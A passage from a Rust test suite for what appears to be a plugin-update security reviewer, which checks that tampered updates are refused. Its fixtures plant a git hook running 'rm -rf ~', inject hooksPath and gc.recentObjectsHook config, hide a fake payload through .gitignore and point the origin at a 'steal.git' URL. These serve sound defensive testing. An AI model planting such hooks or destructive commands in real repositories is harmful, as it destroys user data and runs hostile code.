    git -C "$PLUGIN_DIR" merge -q --ff-only FETCH_HEAD
    if [[ $mode == "dirty" ]]; then
      printf 'planted\n' > "$PLUGIN_DIR/uncommitted-local.txt"
    fi
    if [[ $mode == "corrupt-index" ]]; then
      printf 'garbage' > "$PLUGIN_DIR/.git/index"
    fi
    if [[ $mode == "inject" ]]; then
      printf 'MZ fake payload' > "$PLUGIN_DIR/oma-extra.bin"
    fi
    if [[ $mode == "plant-hook" ]]; then
      printf '#!/bin/sh\nrm -rf ~\n' > "$PLUGIN_DIR/.git/hooks/post-checkout"
      chmod +x "$PLUGIN_DIR/.git/hooks/post-checkout"
    fi
    if [[ $mode == "config-inject" ]]; then
      printf '\n[core]\n\thooksPath = /tmp/omasafe-evil-hooks\n' >> "$PLUGIN_DIR/.git/config"
    fi
    echo "Updated io.example.cli."
    ;;
  "plugin disable io.example.cli")
    set '.plugin.enabled = false'; echo "Disabled io.example.cli"
    ;;
  "plugin enable io.example.cli")
    set '.plugin.enabled = true'; echo "Enabled io.example.cli"
    ;;
  "bar use omarchy.bar")
    echo "Using omarchy.bar"
    ;;
  *)
    echo "fake omarchy: unexpected invocation: $*" >&2
    exit 64
    ;;
esac
"#;
        let shim = bin.join("omarchy");
        fs::write(&shim, script).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&shim, fs::Permissions::from_mode(0o755)).unwrap();
        }
        let _ = fs::remove_file(&log_path);
        Self {
            state_path,
            log_path,
        }
    }

    fn write_state(&self, kinds: &[&str], active: bool) {
        fs::write(
            &self.state_path,
            serde_json::json!({
                "plugin": {
                    "id": "io.example.cli",
                    "enabled": true,
                    "active": active,
                    "firstParty": false,
                    "clonedFrom": "https://plugins.test/cli.git",
                    "kinds": kinds,
                },
                "updateMode": "ok",
            })
            .to_string(),
        )
        .unwrap();
    }

    fn set_mode(&self, mode: &str) {
        let mut state: Value =
            serde_json::from_str(&fs::read_to_string(&self.state_path).unwrap()).unwrap();
        state["updateMode"] = Value::String(mode.into());
        fs::write(&self.state_path, state.to_string()).unwrap();
    }

    fn enabled(&self) -> bool {
        let state: Value =
            serde_json::from_str(&fs::read_to_string(&self.state_path).unwrap()).unwrap();
        state["plugin"]["enabled"] == Value::Bool(true)
    }

    fn log_contains(&self, needle: &str) -> bool {
        fs::read_to_string(&self.log_path)
            .map(|log| log.contains(needle))
            .unwrap_or(false)
    }
}

fn run_git(dir: &Path, args: &[&str]) -> String {
    let output = std::process::Command::new("/usr/bin/git")
        .args(args)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_SYSTEM", "/dev/null")
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8(output.stdout).unwrap().trim().to_owned()
}

fn git_commit_all(dir: &Path, message: &str) -> String {
    run_git(dir, &["add", "-A"]);
    run_git(dir, &["commit", "--quiet", "--allow-empty", "-m", message]);
    run_git(dir, &["rev-parse", "HEAD"])
}

fn init_repo(dir: &Path, bare: bool) {
    let mut args = vec!["init", "--quiet"];
    if bare {
        args.push("--bare");
    }
    args.push(".");
    run_git(dir, &args);
    run_git(dir, &["config", "user.name", "test"]);
    run_git(dir, &["config", "user.email", "test@example.invalid"]);
}

struct UpdateFixture {
    fixture: Fixture,
    origin: TempDir,
    race_origin: TempDir,
    candidate: String,
    raced: String,
    fake: FakeOmarchy,
}

impl UpdateFixture {
    /// Installed repo at commit A with HTTPS-shaped origin; bare origin holds
    /// A then candidate B; a second bare origin adds raced tip C. The bounded
    /// analysis cache is pre-seeded so ensure_pinned_repository fetches from
    /// local transport only.
    fn new() -> Self {
        Self::build(&["bar-widget"], false)
    }

    fn build(kinds: &[&str], active: bool) -> Self {
        let fixture = Fixture::new();
        std::os::unix::fs::symlink("/usr/bin/git", fixture.bin.path().join("git")).unwrap();
        // The fake omarchy shim needs jq; PATH is restricted to bin/.
        std::os::unix::fs::symlink("/usr/bin/jq", fixture.bin.path().join("jq")).unwrap();

        // Working clone that feeds the bare origin.
        let work = TempDir::new().unwrap();
        init_repo(work.path(), false);
        fs::write(
            work.path().join("manifest.json"),
            r#"{"schemaVersion":1,"id":"io.example.cli","name":"n","version":"1","kinds":["bar-widget"],"entryPoints":{"barWidget":"main.qml"}}"#,
        )
        .unwrap();
        fs::write(work.path().join("main.qml"), "Item {}\n").unwrap();
        let base = git_commit_all(work.path(), "A");

        let origin = TempDir::new().unwrap();
        init_repo(origin.path(), true);
        run_git(
            origin.path(),
            &[
                "fetch",
                "--quiet",
                work.path().to_string_lossy().as_ref(),
                "HEAD:refs/heads/main",
            ],
        );
        run_git(origin.path(), &["symbolic-ref", "HEAD", "refs/heads/main"]);

        // Candidate B on top of A.
        fs::write(
            work.path().join("main.qml"),
            "Item { property string x: \"candidate\" }\n",
        )
        .unwrap();
        // The ignored-file channel: the native updater reports a clean
        // worktree while extra bytes ride along. H1's installed-bytes check
        // must catch this even though git metadata says everything is fine.
        fs::write(work.path().join(".gitignore"), "oma-extra.bin\n").unwrap();
        let candidate = git_commit_all(work.path(), "B");
        run_git(
            work.path(),
            &[
                "push",
                "--quiet",
                origin.path().to_string_lossy().as_ref(),
                "HEAD:refs/heads/main",
            ],
        );

        // Raced origin: same history plus different tip C.
        let race_origin = TempDir::new().unwrap();
        init_repo(race_origin.path(), true);
        run_git(
            race_origin.path(),
            &[
                "fetch",
                "--quiet",
                origin.path().to_string_lossy().as_ref(),
                "refs/heads/main:refs/heads/main",
            ],
        );
        run_git(
            race_origin.path(),
            &["symbolic-ref", "HEAD", "refs/heads/main"],
        );
        let raced_work = TempDir::new().unwrap();
        init_repo(raced_work.path(), false);
        run_git(
            raced_work.path(),
            &[
                "pull",
                "--quiet",
                origin.path().to_string_lossy().as_ref(),
                "main",
            ],
        );
        fs::write(
            raced_work.path().join("main.qml"),
            "Item { property string x: \"raced\" }\n",
        )
        .unwrap();
        let raced = git_commit_all(raced_work.path(), "C");
        run_git(
            raced_work.path(),
            &[
                "push",
                "--quiet",
                race_origin.path().to_string_lossy().as_ref(),
                "HEAD:refs/heads/main",
            ],
        );

        // Installed checkout at exactly A whose origin is an HTTPS URL
        // (identity and correlation see production-shaped data).
        init_repo(&fixture.plugin, false);
        // Fixture::new() seeded placeholder files; the exact A checkout
        // replaces them.
        fs::remove_file(fixture.plugin.join("manifest.json")).unwrap();
        fs::remove_file(fixture.plugin.join("main.qml")).unwrap();
        run_git(
            &fixture.plugin,
            &[
                "fetch",
                "--quiet",
                work.path().to_string_lossy().as_ref(),
                &base,
            ],
        );
        run_git(
            &fixture.plugin,
            // Native installs are branch-based clones with a symbolic HEAD, and
            // the fake updater's `merge --ff-only` keeps that shape; using it here
            // ensures verification tolerates symbolic-HEAD installs, not just
            // detached review checkouts.
            &["checkout", "--quiet", "-B", "main", "FETCH_HEAD"],
        );
        assert_eq!(run_git(&fixture.plugin, &["rev-parse", "HEAD"]), base);
        run_git(
            &fixture.plugin,
            &["remote", "add", "origin", "https://plugins.test/cli.git"],
        );

        // Pre-seed the analysis cache: slug must equal sha256(url)[..8] hex.
        let url = "https://plugins.test/cli.git";
        let digest = Sha256::digest(url.as_bytes());
        let slug: String = digest
            .iter()
            .take(8)
            .map(|byte| format!("{byte:02x}"))
            .collect();
        let analysis_cache = fixture.cache.path().join("omasafe/analysis");
        fs::create_dir_all(&analysis_cache).unwrap();
        let cache_repo = analysis_cache.join(format!("{slug}.git"));
        fs::create_dir_all(&cache_repo).unwrap();
        init_repo(&cache_repo, true);
        run_git(
            &cache_repo,
            &[
                "remote",
                "add",
                "origin",
                origin.path().to_string_lossy().as_ref(),
            ],
        );

        let fake = FakeOmarchy::install(fixture.bin.path(), fixture.state.path());
        fake.write_state(kinds, active);

        Self {
            fixture,
            origin,
            race_origin,
            candidate,
            raced,
            fake,
        }
    }

    fn seed_trust(&self) {
        self.fixture.trust_current();
    }

    fn review_update(&self, extra_args: &[&str]) -> (Vec<u8>, Vec<u8>, Option<i32>) {
        let output = self
            .fixture
            .command()
            .env("OMASAFE_FAKE_STATE", &self.fake.state_path)
            .env("OMASAFE_FAKE_LOG", &self.fake.log_path)
            .env(
                "OMASAFE_FAKE_ORIGIN",
                self.origin.path().to_string_lossy().as_ref(),
            )
            .env(
                "OMASAFE_FAKE_RACE_ORIGIN",
                self.race_origin.path().to_string_lossy().as_ref(),
            )
            .env(
                "OMASAFE_FAKE_PLUGIN_DIR",
                self.fixture.plugin.to_string_lossy().as_ref(),
            )
            .env(
                "OMASAFE_FAKE_FS_MONITOR_COMMAND",
                self.fixture.state.path().join("raced-fsmonitor.sh"),
            )
            .env(
                "OMASAFE_FAKE_FS_MONITOR_MARKER",
                self.fixture.state.path().join("raced-fsmonitor-ran"),
            )
            .env("OMASAFE_DEBUG_REVIEW", "1")
            .args(["plugins", "review-update", "io.example.cli"])
            .args(extra_args)
            .output()
            .expect("review-update runs");
        (output.stdout, output.stderr, output.status.code())
    }
}

fn flow_record(fixture: &Fixture) -> Option<Value> {
    let path = fixture.state.path().join("omasafe/review-update.json");
    fs::read_to_string(path)
        .ok()
        .map(|text| serde_json::from_str(&text).unwrap())
}

#[test]
#[cfg(unix)]
fn review_update_refuses_dirty_worktree_before_any_mutation() {
    let update = UpdateFixture::new();
    update.seed_trust();
    fs::write(update.fixture.plugin.join("local.txt"), "uncommitted\n").unwrap();

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1), "{stdout:?} {stderr:?}");
    let text = String::from_utf8_lossy(&stderr);
    assert!(text.contains("dirty"), "{text}");
    assert!(
        !update.fake.log_contains("plugin update"),
        "mutation attempted"
    );
    assert!(
        !update.fake.log_contains("plugin disable"),
        "quiesce attempted"
    );
    assert_eq!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        installed_head_of(&update),
        "live tree moved"
    );
}

#[test]
#[cfg(unix)]
fn review_update_requires_a_trusted_baseline() {
    let update = UpdateFixture::new();
    let (_stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    assert!(
        String::from_utf8_lossy(&stderr).contains("no trusted baseline"),
        "{}",
        String::from_utf8_lossy(&stderr)
    );
    assert!(!update.fake.log_contains("plugin update"));
}

#[test]
#[cfg(unix)]
fn review_update_yes_requires_expected_commit() {
    let update = UpdateFixture::new();
    update.seed_trust();
    let (_stdout, stderr, code) = update.review_update(&["--yes"]);
    assert_eq!(code, Some(1), "usage failure expected");
    let text = String::from_utf8_lossy(&stderr);
    assert!(text.contains("--expected-commit"), "{text}");
    // Fail-fast: no fetch, no evaluation, no mutation.
    assert!(!update.fake.log_contains("plugin update"));
}

#[test]
#[cfg(unix)]
fn review_update_happy_path_updates_enables_and_advances_trust() {
    let update = UpdateFixture::new();
    update.seed_trust();

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(
        code,
        Some(0),
        "{} {}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    let text = String::from_utf8_lossy(&stdout);
    assert!(text.contains("Reviewed update preview"), "{text}");
    assert!(text.contains("Reviewed update complete"), "{text}");

    // Postconditions: exact reviewed commit installed and enabled again.
    assert_eq!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        update.candidate
    );
    assert!(update.fake.enabled(), "plugin must be re-enabled");

    // Quiesce happened before the delegated mutation.
    let log = fs::read_to_string(&update.fake.log_path).unwrap();
    let disable = log.find("plugin disable").unwrap();
    let mutation = log.find("plugin update").expect(log.as_str());
    let enable = log.find("plugin enable").expect(log.as_str());
    assert!(disable < mutation && mutation < enable);

    // Trust baseline advanced to the candidate; interrupted record removed.
    let history: Value = serde_json::from_slice(
        &fs::read(
            update
                .fixture
                .state
                .path()
                .join("omasafe/trust-history.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_eq!(
        history["records"].as_array().unwrap().last().unwrap()["accepted"]["head"],
        Value::String(update.candidate.clone())
    );
    assert!(
        !flow_record(&update.fixture).is_some(),
        "flow record left behind"
    );
}

#[test]
#[cfg(unix)]
fn review_update_aborts_on_invalid_manifest_candidate() {
    let update = UpdateFixture::new();
    update.seed_trust();
    // Build a candidate that violates the native manifest rules: strip the
    // required name field by rewriting history is heavy; instead point the
    // cache at a repo whose tip has an empty kinds array via a third push.
    let work = TempDir::new().unwrap();
    init_repo(work.path(), false);
    run_git(
        work.path(),
        &[
            "pull",
            "--quiet",
            update.origin.path().to_string_lossy().as_ref(),
            "main",
        ],
    );
    fs::write(
        work.path().join("manifest.json"),
        r#"{"schemaVersion":1,"id":"io.example.cli","name":"n","version":"1","kinds":[],"entryPoints":{}}"#,
    )
    .unwrap();
    git_commit_all(work.path(), "bad kinds");
    run_git(
        work.path(),
        &[
            "push",
            "--quiet",
            update.origin.path().to_string_lossy().as_ref(),
            "HEAD:refs/heads/main",
        ],
    );
    let invalid = run_git(work.path(), &["rev-parse", "HEAD"]);

    let (stdout, stderr, code) = update.review_update(&["--yes", "--expected-commit", &invalid]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("native manifest validation"), "{text}");
    assert!(!update.fake.log_contains("plugin update"));
    assert_eq!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        installed_head_of(&update)
    );
    assert!(!flow_record(&update.fixture).is_some());
}

#[test]
#[cfg(unix)]
fn review_update_native_failure_leaves_disabled_with_guidance() {
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("fail");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("left disabled"), "{text}");
    assert!(text.contains("manual recovery"), "{text}");
    assert!(
        !update.fake.enabled(),
        "must not auto re-enable after native failure"
    );
    assert_eq!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        installed_head_of(&update),
        "content changed despite native rollback"
    );
    let record = flow_record(&update.fixture).expect("recovery record kept");
    assert_eq!(record["phase"], Value::String("failed".into()));
}

#[test]
#[cfg(unix)]
fn review_update_raced_commit_is_detected_and_plugin_stays_disabled() {
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("race");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("raced candidate"), "{text}");
    assert!(
        text.contains(&update.raced),
        "guidance names the foreign HEAD"
    );
    assert!(!update.fake.enabled());
    assert_eq!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        update.raced,
        "raced content stays put for manual inspection"
    );
    let history: Value = serde_json::from_slice(
        &fs::read(
            update
                .fixture
                .state
                .path()
                .join("omasafe/trust-history.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_ne!(
        history["records"].as_array().unwrap().last().unwrap()["accepted"]["head"],
        Value::String(update.raced.clone()),
        "trust must never advance to an unreviewed commit"
    );
}

#[test]
#[cfg(unix)]
fn review_update_rescan_failure_after_mutation_reports_guidance() {
    let update = UpdateFixture::new();
    update.seed_trust();
    let mut state: Value =
        serde_json::from_str(&fs::read_to_string(&update.fake.state_path).unwrap()).unwrap();
    state["listFails"] = Value::Bool(true);
    state["updateMode"] = Value::String("ok".into());
    fs::write(&update.fake.state_path, state.to_string()).unwrap();

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("rescan verification failed"), "{text}");
    assert!(!update.fake.enabled());
    assert_eq!(
        flow_record(&update.fixture).unwrap()["phase"],
        Value::String("failed".into())
    );
}

#[test]
#[cfg(unix)]
fn review_update_dirty_worktree_after_mutation_fails_closed() {
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("dirty");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("not verified clean"), "{text}");
    assert!(text.contains("stays disabled"), "{text}");
    assert!(!update.fake.enabled(), "must not re-enable an unclean tree");
    assert!(
        !update.fake.log_contains("plugin enable"),
        "re-enable attempted despite dirty worktree"
    );
    assert_eq!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        update.candidate
    );
    let history: Value = serde_json::from_slice(
        &fs::read(
            update
                .fixture
                .state
                .path()
                .join("omasafe/trust-history.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_ne!(
        history["records"].as_array().unwrap().last().unwrap()["accepted"]["head"],
        Value::String(update.candidate.clone()),
        "trust must not advance past a dirty postcondition"
    );
    assert_eq!(
        flow_record(&update.fixture).unwrap()["phase"],
        Value::String("failed".into())
    );
}

#[test]
#[cfg(unix)]
fn review_update_unknown_dirty_state_fails_closed() {
    // git status unavailable after the update is the same uncertainty the
    // pre-flight refuses; post-update it must refuse with equal force.
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("corrupt-index");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("git status is unavailable"), "{text}");
    assert!(text.contains("stays disabled"), "{text}");
    assert!(!update.fake.enabled());
    assert!(!update.fake.log_contains("plugin enable"));
    let history: Value = serde_json::from_slice(
        &fs::read(
            update
                .fixture
                .state
                .path()
                .join("omasafe/trust-history.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_ne!(
        history["records"].as_array().unwrap().last().unwrap()["accepted"]["head"],
        Value::String(update.candidate.clone())
    );
}

#[test]
#[cfg(unix)]
fn review_update_planted_ignored_payload_is_detected() {
    // HEAD matches and `git status` is clean because the extra file rides in
    // through .gitignore — only re-reading the installed bytes catches it.
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("inject");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("installed bytes differ"), "{text}");
    assert!(text.contains("oma-extra.bin"), "diffing file named: {text}");
    assert!(!update.fake.enabled());
    assert!(!update.fake.log_contains("plugin enable"));
    let history: Value = serde_json::from_slice(
        &fs::read(
            update
                .fixture
                .state
                .path()
                .join("omasafe/trust-history.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_ne!(
        history["records"].as_array().unwrap().last().unwrap()["accepted"]["head"],
        Value::String(update.candidate.clone()),
        "trust must never advance to unverified bytes"
    );
}

#[test]
#[cfg(unix)]
fn scan_high_finding_reaches_notification_with_catalog_severity() {
    // H1 exit criterion: a High finding reaches the notification path as
    // High, not as a generic warning.
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "import QtQuick\nimport Quickshell.WlSessionLock\nItem { WlSessionLock {} }\n",
    )
    .unwrap();

    let notify_log = fixture.state.path().join("notify-log.txt");
    let shim = fixture.bin.path().join("notify-send");
    fs::write(
        &shim,
        format!(
            "#!/bin/sh\necho \"$*\" >> {}\n",
            notify_log.to_string_lossy()
        ),
    )
    .unwrap();
    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(&shim, fs::Permissions::from_mode(0o755)).unwrap();

    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(
        !kinds.contains(&"finding-regression".to_owned()),
        "{kinds:?}"
    );

    let mut record = stored_analysis_event(&fixture, "io.example.cli");
    record["finding_rule_ids"] = serde_json::json!([]);
    let path = fixture.state.path().join("omasafe/scan-state.json");
    let mut state: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    state["analysis_events"]["io.example.cli"] = record;
    fs::write(&path, serde_json::to_vec_pretty(&state).unwrap()).unwrap();

    let output = fixture
        .command()
        .args(["scan", "--include-analysis", "--format", "json", "--notify"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let alert = report["result"]["alerts"]
        .as_array()
        .unwrap()
        .iter()
        .find(|alert| alert["kind"] == "finding-regression")
        .expect("finding-regression alert present")
        .clone();
    assert_eq!(alert["severity"], Value::String("high".into()), "{}", alert);
    assert_eq!(report["result"]["highest_severity"], "high");

    let delivered = fs::read_to_string(&notify_log).unwrap_or_default();
    assert!(delivered.contains("[high]"), "{delivered}");
    assert!(delivered.contains("oma.qml.session-lock"), "{delivered}");
}

#[test]
#[cfg(unix)]
fn review_update_planted_git_hook_is_detected() {
    // Hooks are part of SourceIdentity's audited file digests; a hook planted
    // during the update window must fail the installed-bytes comparison even
    // though HEAD matches and the worktree is clean.
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("plant-hook");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(
        text.contains("installed bytes differ") || text.contains("active (non-template) git hook"),
        "{text}"
    );
    assert!(
        text.contains(".git/hooks/post-checkout") || text.contains("post-checkout"),
        "{text}"
    );
    assert!(!update.fake.enabled());
    assert!(!update.fake.log_contains("plugin enable"));
}

#[test]
#[cfg(unix)]
fn review_update_injected_hookspath_config_is_refused() {
    // core.hooksPath redirects every git hook execution. Written DURING the
    // update window it never reaches native Git as anything but the hardened
    // snapshot (which the restore discards), and the tamper-evident restore
    // must refuse the update outright.
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("config-inject");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("modified during the update window"), "{text}");
    let config = fs::read_to_string(update.fixture.plugin.join(".git/config")).unwrap();
    assert!(
        !config.contains("hooksPath"),
        "the injection must not survive the restore: {config}"
    );
    assert!(!update.fake.enabled());
    assert!(!update.fake.log_contains("plugin enable"));
}

#[test]
#[cfg(unix)]
fn review_update_refuses_preexisting_hook_or_config_before_mutation() {
    // The native updater runs git fetch + merge, which would EXECUTE a
    // pre-existing post-merge hook and honor config directives before the
    // postcondition could merely report them. The audit must gate the
    // mutation: the updater is never invoked on refusal.
    let update = UpdateFixture::new();
    update.seed_trust();
    run_git(
        &update.fixture.plugin,
        &["config", "gc.recentObjectsHook", "touch /tmp/omasafe-pwned"],
    );

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("refused before mutation"), "{text}");
    assert!(text.contains("gc.recentobjectshook"), "{text}");
    assert!(
        !update
            .fake
            .log_contains("plugin update io.example.cli --yes"),
        "the native updater must not run after a pre-mutation refusal"
    );
    assert!(!update.fake.enabled());
    assert!(!update.fake.log_contains("plugin enable"));
}

#[test]
#[cfg(unix)]
fn review_update_refuses_tampered_origin_url_before_mutation() {
    // remote.origin.url is value-validated against the production HTTPS
    // origin by the pre-mutation audit. A hostile https URL on a different
    // host is refused offline-deterministically (cache is keyed by the real
    // URL slug; the fetch gate and the audit both fail closed) BEFORE the
    // native updater is ever invoked. A non-https tamper such as `ext::...`
    // is refused even earlier by the candidate-resolution gate.
    let update = UpdateFixture::new();
    update.seed_trust();
    run_git(
        &update.fixture.plugin,
        &[
            "remote",
            "set-url",
            "origin",
            "https://127.0.0.1:1/steal.git",
        ],
    );

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(
        text.contains("refused") || text.contains("failed"),
        "{text}"
    );
    assert!(
        !update
            .fake
            .log_contains("plugin update io.example.cli --yes"),
        "the native updater must not run after a hostile-origin refusal"
    );
    // The refusal precedes any mutation: the enabled state is untouched.
    assert!(update.fake.enabled());
}

#[test]
#[cfg(unix)]
fn review_update_hardens_native_updater_git_environment() {
    // The updater's git children must run with hooks disabled and hardened
    // config, inherited through the environment; env-injected config is
    // invisible to the .git/config file audit by construction.
    let update = UpdateFixture::new();
    update.seed_trust();

    let (_, _, code) = update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(0));
    assert!(
        update.fake.log_contains(
            "gitenv=5:core.fsmonitor=false:core.hooksPath=/dev/null:diff.external=:protocol.ext.allow=never:credential.helper="
        ),
        "full Git hardening missing from the updater environment: {}",
        fs::read_to_string(&update.fake.log_path).unwrap_or_default()
    );
}

#[test]
#[cfg(unix)]
fn review_update_neutralizes_mid_update_fsmonitor_injection() {
    // The fake updater runs after OmaSafe's pre-mutation audit and appends
    // core.fsmonitor to .git/config synchronously BEFORE its git fetch and
    // merge — exactly the execution window. The hardened config snapshot must
    // keep native Git from consuming mutable local config: the raced command
    // never executes (env fsmonitor=false overrides anything appended), the
    // restore discards it, and the tamper-evident restore refuses the update.
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("config-race");

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(code, Some(1));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    assert!(text.contains("modified during the update window"), "{text}");
    assert!(
        !update
            .fixture
            .state
            .path()
            .join("raced-fsmonitor-ran")
            .exists(),
        "the raced fsmonitor command must not execute"
    );
    let config = fs::read_to_string(update.fixture.plugin.join(".git/config")).unwrap();
    assert!(
        !config.contains("fsmonitor"),
        "the injection must not survive the update-window restore: {config}"
    );
    assert!(
        update.fake.log_contains(
            "gitenv=5:core.fsmonitor=false:core.hooksPath=/dev/null:diff.external=:protocol.ext.allow=never:credential.helper="
        ),
        "full Git hardening missing from the raced update: {}",
        fs::read_to_string(&update.fake.log_path).unwrap_or_default()
    );
    assert!(!update.fake.enabled());
    assert!(!update.fake.log_contains("plugin enable"));
}

#[test]
#[cfg(unix)]
fn scan_finding_regression_alerts_carry_catalog_severity() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();

    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(
        !kinds.contains(&"finding-regression".to_owned()),
        "{kinds:?}"
    );

    let mut record = stored_analysis_event(&fixture, "io.example.cli");
    record["finding_rule_ids"] = serde_json::json!([]);
    let path = fixture.state.path().join("omasafe/scan-state.json");
    let mut state: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    state["analysis_events"]["io.example.cli"] = record;
    fs::write(&path, serde_json::to_vec_pretty(&state).unwrap()).unwrap();

    let output = fixture
        .command()
        .args(["scan", "--include-analysis", "--format", "json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let alert = report["result"]["alerts"]
        .as_array()
        .unwrap()
        .iter()
        .find(|alert| alert["kind"] == "finding-regression")
        .expect("finding-regression alert present")
        .clone();
    assert_eq!(
        alert["severity"],
        Value::String("medium".into()),
        "{}",
        serde_json::to_string_pretty(&report).unwrap()
    );
    assert!(
        alert["message"]
            .as_str()
            .unwrap()
            .contains("oma.qml.process-execution")
    );
    assert_eq!(report["result"]["highest_severity"], "medium");
}

#[test]
#[cfg(unix)]
fn review_update_full_bar_switches_default_bar_back_before_mutation() {
    let update = UpdateFixture::build(&["bar"], true);
    update.seed_trust();

    let (stdout, stderr, code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    assert_eq!(
        code,
        Some(0),
        "{} {}",
        String::from_utf8_lossy(&stdout),
        String::from_utf8_lossy(&stderr)
    );
    let log = fs::read_to_string(&update.fake.log_path).unwrap();
    let bar_switch = log.find("bar use omarchy.bar").expect("bar switched back");
    let mutation = log.find("plugin update").unwrap();
    assert!(bar_switch < mutation, "{log}");
    assert!(
        log.contains("plugin enable"),
        "bar plugin re-enabled after success"
    );
    assert!(update.fake.enabled());
}

#[test]
#[cfg(unix)]
fn review_update_interrupted_record_prints_recovery_guidance() {
    let update = UpdateFixture::new();
    update.seed_trust();
    fs::create_dir_all(update.fixture.state.path().join("omasafe")).unwrap();
    fs::write(
        update
            .fixture
            .state
            .path()
            .join("omasafe/review-update.json"),
        serde_json::json!({
            "schema_version": 1,
            "plugin_id": "io.example.cli",
            "candidate_commit": "a".repeat(40),
            "started_at": "2026-01-01T00:00:00Z",
            "phase": "delegating",
            "quiesced": ["disabled"],
        })
        .to_string(),
    )
    .unwrap();

